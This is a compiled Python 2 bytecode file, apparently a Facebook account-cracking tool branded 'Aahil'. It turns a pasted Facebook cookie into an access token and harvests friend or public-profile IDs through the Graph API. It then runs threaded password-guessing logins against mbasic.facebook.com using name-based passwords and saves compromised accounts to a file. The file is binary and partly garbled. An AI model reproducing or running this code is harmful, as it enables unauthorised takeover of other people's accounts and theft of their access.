ó
E^`c           @   sñ  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l
 Z
 d  d l Z d  d l Z d  d l m Z d  d l m Z y° d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l
 Z
 d  d l Z d  d l m Z Wn_ e k
 rÍe  j d  e  j d  e  j d  e  j d  e  j d  e  j d  n Xy e  j d	  Wn n Xe e  e j d
  d Z d Z d Z d Z d Z d Z d Z d Z y d  d l Z Wn e k
 r`e  j d  n Xy d  d l Z Wn e k
 re  j d  n Xd   Z  d   Z! d   Z" d   Z# d Z$ d   Z% g  Z& g  Z' g  Z( d Z) g  Z* g  Z+ g  Z, g  Z- g  Z. g  a/ g  Z0 g  a1 g  Z2 g  Z3 g  Z4 g  Z5 g  Z6 g  Z7 g  Z* d Z8 d Z9 d   Z: d   Z; d   Z< d   Z= d    Z> d!   Z? d"   Z@ d#   ZA d$   ZB d%   ZC d&   ZD d'   ZE d(   ZF d)   ZG d*   ZH eI d+ k ríe  j d,  e:   n  d S(-   iÿÿÿÿN(   t
   ThreadPool(   t   ConnectionErrors   pip2 install requestss   pip2 install mechanizes   pip2 install tors   pkg install tors   python2 token100.pyt   savet   utf8s   [1;91ms   [1;92ms   [1;93ms   [1;94ms   [1;95ms   [1;96ms   [1;97ms   [0mc           C   s   d GHt  j j   d  S(   Ns   [1;97m[!] Exit(   t   ost   syst   exit(    (    (    s
   Khanjan.pyt   keluar-   s    c         C   sS   d } d } x: |  D]2 } | d | t  j d t |  d  | 7} q Wt |  S(   Nt   mhkbpcPt    t   !i    i   (   t   randomt   randintt   lent   cetak(   t   xt   wt   dt   i(    (    s
   Khanjan.pyt   acak2   s
    0c         C   s~   d } xA | D]9 } | j  |  } |  j d | d t d |   }  q W|  d 7}  |  j d d  }  t j j |  d  d  S(   NR   s   !%ss   [%s;1mi   s   [0ms   !0s   
(   t   indext   replacet   strR   t   stdtokett   write(   R   R   R   t   j(    (    s
   Khanjan.pyR   ;   s    (
c         C   sC   x< |  d D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns   
g©?(   R   t   stdoutR   t   flusht   timet   sleep(   t   zt   e(    (    s
   Khanjan.pyt   jalanF   s    s>  

[1;97m   
    _____             .__      .__  .__   
   /  _  \   _____    |  |__   |__| |  |  
  /  /_\  \  \__  \   |  |  \  |  | |  |  
 /    |    \  / __ \_ |   Y  \ |  | |  |__
 \____|__  / (____  / |___|  / |__| |____/
         \/       \/       \/            
 DONT COPY ME YOU DONT HAVE LEVEL TO COMPETE ME c          C   sF   d d d g }  x0 |  D]( } d | Gt  j j   t j d  q Wd  S(   Ns   .   s   ..  s   ... s'   [1;97m[+] [1;97mSedang Login [1;97mi   (   R   R   R   R   R   (   t   titikt   o(    (    s
   Khanjan.pyt   tikO   s
    i    s   [31m   Not Vulns   [32m   Vulnc          C   s   t  j d  y t d d  }  t   WnQ t t f k
 rz t  j d  t GHd d GHd GHd GHd GHd d GHt   n Xd  S(	   Nt   clears	   login.txtt   ri0   t   -s   [1] Login Using Token Facebooks   [2] Login Using Cookie Facebooks   [0] Exit Aahil Tool(   R   t   systemt   opent   menut   KeyErrort   IOErrort   logot   pilih_masuk(   t   toket(    (    s
   Khanjan.pyt   masukn   s    		c          C   s   t  d  }  |  d k r' d GHt   nr |  d k s? |  d k rI t   nP |  d k sa |  d k rk t   n. |  d k s |  d	 k r t   n d GHt   d  S(
   Ns   [?] Select : R	   s   [!] Isi Yg Benar !t   1t   01t   2t   02t   0t   00(   t	   raw_inputR-   t   tokenzt   cookieR   (   t   msuk(    (    s
   Khanjan.pyR-   ~   s    



c          C   s)  t  j d  t GHd d GHt d  }  y t j d d i	 d d 6d	 d
 6d d 6d d 6d d 6d d 6d d 6d d 6d d 6d i |  d 6} t j d | j  } | d  k r² d n d | j
 d  } Wn t j j k
 rä d GHn Xt d  d!  }  |  j | j
 d   |  j   t d"  t   d  S(#   NR$   i0   R&   s   [?] Cookie : sG   https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_t   headerss   Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36s
   user-agents   https://m.facebook.com/t   referers   m.facebook.comt   hosts   https://m.facebook.comt   originR0   s   upgrade-insecure-requestss#   id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7s   accept-languages	   max-age=0s   cache-controlsU   text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8t   accepts   text/html; charset=utf-8s   content-typet   cookiesR8   s	   (EAAA\w+)s&   
* Fail : maybe your cookie invalid !!s   
*   Your fb access token : i   s   [!] No Connections	   login.txtR   s   [1;92m[+] Login Hogaii[1;97m(   R   R'   R,   R6   t   requestst   gett   ret   searcht   textt   Nonet   groupt
   exceptionsR   R(   R   t   closeR    R)   (   R8   t   datat
   find_tokent   hasil(    (    s
   Khanjan.pyR8      s0    	)	

c          C   sù   t  j d  y t d d  }  t   WnË t t f k
 rô t  j d  t GHd d GHt d  }  y` t j	 d |   } t
 j | j  } t d d  } | j |   | j   t d	  t   Wqõ t k
 rð d
 GHt j d  t   qõ Xn Xd  S(   NR$   s	   login.txtR%   i0   R&   s   [?] Token :[1;97m s+   https://graph.facebook.com/me?access_token=R   s%   [1;92m[+] Login Hogaii[1;97m[1;97ms&   [[1;97m![1;97m] [1;97mToken salah !g333333û?(   R   R'   R(   R)   R*   R+   R,   R6   R@   RA   t   jsont   loadsRD   R   RH   R    R   R   R7   (   R.   t   otwt   at   zedd(    (    s
   Khanjan.pyR7   ª   s*    	

c          C   s^  t  j d  y t d d  j   a Wn7 t k
 r_ d GHt  j d  t  j d  t   n Xy3 t j d t  }  t	 j
 |  j  } | d } Wnf t k
 rÙ t  j d  d GHt  j d  t j d	  t   n# t j j k
 rû d
 GHt   n Xt  j d  t  j d  t GHd d GHd | d GHd GHd GHd GHd GHd GHd d GHt   d  S(   NR$   s	   login.txtR%   s   [!] Token Invalid !s   rm -rf login.txts,   https://graph.facebook.com/me/?access_token=t   names   [!] [1;97mToken invalidi   s	   [!] Erorrs   git pulli0   R&   s   
[1;97m[ Welcome [1;93ms	   [1;97m ]s   
[1;97m[1] Start Crack s&   [2] Search For Facebook Username & ID s   [3] Join Aahils   [4] Update toolss
   [0] Logout(   R   R'   R(   t   readR.   R+   R/   R@   RA   RL   RM   RD   R*   R   R   RG   R   R   R,   t
   pilih_menu(   RN   RO   t   nama(    (    s
   Khanjan.pyR)   Â   sB    
		c          C   sî   t  d  }  |  d k r' d GHt   nÃ |  d k s? |  d k rI t   n¡ |  d k sa |  d k rk t   n |  d k s |  d	 k r t   n] |  d
 k s¥ |  d k r¯ t   n; |  d k sÇ |  d k rÞ t j d  t   n d GHt   d  S(   Ns   [?] Menu : R	   s   [!] [1;97mIsi yang benarR0   R1   R2   R3   t   3t   03t   4t   04R4   R5   s   rm -rf login.txt(	   R6   RS   t
   passchoicet   uidt   grupt   updatetoolsR   R'   R   (   t   peak(    (    s
   Khanjan.pyRS   é   s"    





c           C   s>   t  j d  t GHd d GHd GHd GHd GHd d GHt   d  S(   NR$   i0   R&   s   [1] Crack From FriendLists   [2] Crack From Public IDs   [0] Back To Menu(   R   R'   R,   t   pilih_passxd(    (    (    s
   Khanjan.pyRY   þ   s    		c             s  t  d  }  |  d k r' d GHt   n.|  d k s? |  d k rÝ t j d  t GHd d GHt d	  t j d
 t  } t	 j
 | j  } xÉ| d D]B } | d } | d } | j d  d } t j | d |  q Wnx|  d k sõ |  d k r't j d  t GHd d GHt  d  } y> t j d | d t  } t	 j
 | j  }	 d |	 d GHWnI t k
 rd GHt  d  t   n# t j j k
 r¥d GHt   n Xt j d | d t  } t	 j
 | j  } x | d D]B }
 |
 d } |
 d } | j d  d } t j | d |  qÞWn. |  d k s?|  d k rIt   n d GHt   t  d    t  d   t  d    d d GHd! GHd d GH    f d"   } t d#  } | j | t  d d GHd$ GHd% t t t   d& t t t   GHd' GHd d GHt  d(  t   d  S()   Ns   [?] Select : R	   s   [!] [1;97mIsi yang benarR0   R1   R$   i0   R&   s   [+] Mengambil IDs3   https://graph.facebook.com/me/friends?access_token=RI   t   idRQ   t    i    t   |R2   R3   s   [+] ID Public : s   https://graph.facebook.com/s   ?access_token=s   [+] Name : s   [!] ID Publik There Is No !s   
 [Back]s   [!] Tidak ada koneksi !s   /friends?access_token=R4   R5   s   [!] Isi yang benars   [?] Password 1 [1;97m:[1;97m s   [?] Password 2 [1;97m:[1;97m s   [?] Password 3 [1;97m:[1;97m s1     [41m   RUNNING CRACK FACEBOOK ACCOUNTS   [00mc   
         s§  |  } | j  d  \ } } y~t j d d i | d 6  d 6d d 6d i d	 d
 6} | j } d | k sv d | k rÍ d | d   GHt d d  } | j d | d    | j   t j |    nËd | k r0d | d   GHt d d  } | j d | d    | j   t	 j |    nht j d d i | d 6 d 6d d 6d i d	 d
 6} | j } d | k sd | k rßd | d  GHt d d  } | j d | d   | j   t j |   n¹d | k rBd | d  GHt d d  } | j d | d   | j   t	 j |   nVt j d d i | d 6 d 6d d 6d i d	 d
 6} | j } d | k sd | k rñd | d  GHt d d  } | j d | d   | j   t j |   n§d | k rTd | d  GHt d d  } | j d | d   | j   t	 j |   nD| j
   d } t j d d i | d 6| d 6d d 6d i d	 d
 6} | j } d | k s¼d | k rd | d | GHt d d  } | j d | d |  | j   t j | |  nd | k rvd | d | GHt d d  } | j d | d |  | j   t	 j | |  n"| j
   d }	 t j d d i | d 6|	 d 6d d 6d i d	 d
 6} | j } d | k sÞd | k r5d | d |	 GHt d d  } | j d | d |	  | j   t j | |	  nc d | k rd | d |	 GHt d d  } | j d | d |	  | j   t	 j | |	  n  Wn n Xd  S(   NRa   s%   https://mbasic.facebook.com/login.phpRI   t   emailt   passt   submitt   loginR:   sË   Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]s
   user-agentt   mbasic_logout_buttons   save-devices   [1;92m[Succesfull] s    â s   done/Indo.txtRO   s   
[Hack] t
   checkpoints   [1;92m[Checkpoint] s	   
[Check] s   [1;97m[Checkpoint] t   123t   12345(   t   splitR@   t   postt   contentR(   R   RH   t   okst   appendt   cekpointt   lower(
   t   argt   userRZ   RQ   t   rext   xot   oket   cekt   pass4t   pass5(   t   pass1t   pass2t   pass3(    s
   Khanjan.pyt   main@  s    7	

7	

7	

7	

7	

i   s:   
[1;97m   [[1;97mâ[1;97m] Process Has Been Completed s/   [+]  Total [1;97mOK[1;97m/[1;97mCP[1;97m : t   /s4   [+] Cracking Accounts Has Been Saved : done/Indo.txts   
 [Press Enter Go Back To Menu](   R6   R^   R   R'   R,   R    R@   RA   R.   RL   RM   RD   t   rsplitR_   Rn   R*   R)   RG   R   R   RY   R    t   mapR   R   Rm   Ro   (   R]   R%   R   t   sRZ   t   nat   nmt   idtt   pokt   spR   R|   t   p(    (   Ry   Rz   R{   s
   Khanjan.pyR^   	  sv    
	


	




		S	)	
c           C   s>   t  j d  t GHd d GHd GHd GHd GHd d GHt   d  S(   NR$   i0   R&   s   [1] Search ID Using Username  s   [2] Search Username Using ID  s	   [0] Back (   R   R'   R,   RC   (    (    (    s
   Khanjan.pyRZ     s    		c          C   s   t  d  }  |  d k r' d GHt   nf |  d k s? t d k rI t   nD |  d k sa t d k rk t   n" |  d k r t   n d GHt   d  S(	   Ns   [?] : R	   s   [!] Wrong InputR0   R1   R2   R3   R4   (   R6   RZ   t   idft   usR)   (   t   ud(    (    s
   Khanjan.pyRC   ©  s    



c          C   sâ   y t  d  }  d |  } t j |  j } t j d |  j d  j d  } t j d |  j d  } d | GHd | d	 GHt  d
  t   WnI t j	 j
 k
 r· d GHt   n' t k
 rÝ d GHt  d
  t   n Xd  S(   Ns   
Input Username Fb : s   https://www.facebook.com/s   Title">(.*?)</i   s
   | Facebooks   profile/(.*?)" s   
Nama : s   Id   : s   
s   
[Back]s   [!] Koneksi bermasalahs   [!] Username tidak di temukan(   R6   R@   RA   RD   RB   RC   RF   t   stripRZ   RG   R   R   t   AttributeError(   t   ut   urlR%   RQ   R_   (    (    s
   Khanjan.pyR   ¹  s"    
$	


c          C   sâ   y t  d  }  d |  } t j |  j } t j d |  j d  j d  } t j d |  j d  } d | GHd | d	 GHt  d
  t   WnI t j	 j
 k
 r· d GHt   n' t k
 rÝ d GHt  d
  t   n Xd  S(   Ns   
Input ID Fb : s   https://www.facebook.com/s   Title">(.*?)</i   s
   | Facebooks"   https://www.facebook.com/(.*?)" />s   
Nama     : s   Username : s   
s   
[Back]s   [!] Koneksi bermasalahs   [!] Id tidak di temukan(   R6   R@   RA   RD   RB   RC   RF   R   RZ   RG   R   R   R   (   R   R   R%   RQ   Rr   (    (    s
   Khanjan.pyR   Í  s"    
$	


c           C   s>   t  j d  t GHd d GHd GHd GHd GHd d GHt   d  S(   NR$   i0   R&   s!   
[1] â¤ Aahil Creations Page â¤s   [2] Aahil ID s   [0] Back(   R   R'   R,   t
   pilih_grup(    (    (    s
   Khanjan.pyR[   á  s    		c          C   sÉ   t  d  }  |  d k r' d GHt   n |  d k re t j d  t GHd d GHt j d  t   n` |  d	 k r£ t j d  t GHd d GHt j d
  t   n" |  d k r¹ t   n d GHt   d  S(   Ns   [?] : R	   s   [!] Isi Yg BenarR0   R$   i0   R&   s2   xdg-open https://www.facebook.com/103679511141844/R2   s/   xdg-open https://www.facebook.com/aahilrana4072R4   (   R6   R   R   R'   R,   R[   R)   (   t   gc(    (    s
   Khanjan.pyR   ì  s(    
	
	

c           C   s8   t  j d  t  j d  t  j d  t  j d  d  S(   NR$   s   pip2 install --upgrade s   git pull(   R   R'   (    (    (    s
   Khanjan.pyR\     s    t   __main__s   git pull(J   R   R   R   t   datetimeR   t   hashlibRB   t	   threadingRL   t   urllibt	   cookielibR@   t   uuidt   multiprocessing.poolR    t   requests.exceptionsR   t   getpasst   ImportErrorR'   t   mkdirt   reloadt   setdefaultencodingt   meraht   limet   kuningt   birut   ungut   bluet   putiht   tutupt	   mechanizeR   R   R   R    R,   R#   t   idmemt   idfriendt   idfromfriendt   backt   cekrekt   threadst   berhasilt   emtemant   emfromfriendRo   Rg   Rm   R_   t
   auto_totalt   auto_okt   auto_cpt   auto_runt   listgrupt   vulnott   vulnR/   R-   R8   R7   R)   RS   RY   R^   RZ   RC   R   R   R[   R   R\   t   __name__(    (    (    s
   Khanjan.pyt   <module>   s   
												'										